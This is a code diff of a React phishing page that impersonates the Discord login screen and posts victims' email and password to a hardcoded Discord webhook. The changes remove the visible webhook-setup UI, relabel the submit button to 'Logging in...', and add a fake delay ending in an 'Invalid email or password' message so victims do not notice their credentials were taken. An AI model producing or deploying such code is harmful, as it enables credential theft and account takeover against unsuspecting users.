@@ -8,9 +8,11 @@ function App() {
     password: ''
   });
   const [showPassword, setShowPassword] = useState(false);
-  const [webhookUrl, setWebhookUrl] = useState('');
-  const [showWebhookInput, setShowWebhookInput] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+
+  // ⚠️ REPLACE THIS WITH YOUR DISCORD WEBHOOK URL ⚠️
+  const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+  
   const handleInputChange = (e) => {
     setFormData({
       ...formData,
@@ -21,9 +23,15 @@ function App() {
   const handleSubmit = async (e) => {
     e.preventDefault();
     
-    if (!webhookUrl) {
-      alert('Please enter your Discord webhook URL first!');
-      setShowWebhookInput(true);
+    // Check if webhook URL is configured
+    if (DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+      console.error('Discord webhook URL not configured!');
+      // Show fake loading to user, but log error for developer
+      setIsLoading(true);
+      setTimeout(() => {
+        setIsLoading(false);
+        alert('Invalid email or password.');
+      }, 2000);
       return;
     }
 
@@ -70,7 +78,7 @@ function App() {
         }]
       };
 
-      const response = await fetch(webhookUrl, {
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -114,37 +122,6 @@ function App() {
       <div className="absolute top-8 left-8 z-10">
         <DiscordLogo />
       </div>
-
-      {/* Webhook URL Input (Hidden by default) */}
-      {showWebhookInput && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-          <div className="bg-discord-dark p-6 rounded-lg max-w-md w-full mx-4">
-            <h3 className="text-white text-xl font-semibold mb-4">Enter Discord Webhook URL</h3>
-            <input
-              type="url"
-              placeholder="https://discord.com/api/webhooks/..."
-              value={webhookUrl}
-              onChange={(e) => setWebhookUrl(e.target.value)}
-              className="w-full p-3 bg-discord-input border border-discord-border rounded text-white placeholder-gray-400 focus:border-discord-blurple focus:outline-none mb-4"
-            />
-            <div className="flex gap-3">
-              <button
-                onClick={() => setShowWebhookInput(false)}
-                className="flex-1 py-2 px-4 bg-gray-600 text-white rounded hover:bg-gray-700 transition-colors"
-              >
-                Cancel
-              </button>
-              <button
-                onClick={() => setShowWebhookInput(false)}
-                disabled={!webhookUrl}
-                className="flex-1 py-2 px-4 bg-discord-blurple text-white rounded hover:bg-discord-blurple-hover transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
-              >
-                Save
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
 
       {/* Main content container */}
       <div className="relative z-10 min-h-screen flex items-center justify-center p-4">
@@ -206,7 +183,7 @@ function App() {
                 disabled={isLoading}
                 className="w-full bg-discord-blurple hover:bg-discord-blurple-hover text-white font-medium py-3 px-4 rounded transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                {isLoading ? 'Sending...' : 'Log In'}
+                {isLoading ? 'Logging in...' : 'Log In'}
               </button>
 
               <div className="text-sm text-discord-text-secondary">
@@ -214,17 +191,6 @@ function App() {
                 <a href="#" className="text-discord-link hover:underline">
                   Register
                 </a>
-              </div>
-
-              {/* Webhook setup button */}
-              <div className="pt-4 border-t border-discord-border">
-                <button
-                  type="button"
-                  onClick={() => setShowWebhookInput(true)}
-                  className="w-full text-discord-link text-sm hover:underline"
-                >
-                  🔗 {webhookUrl ? 'Update' : 'Set'} Discord Webhook URL
-                </button>
               </div>
             </form>
           </div>
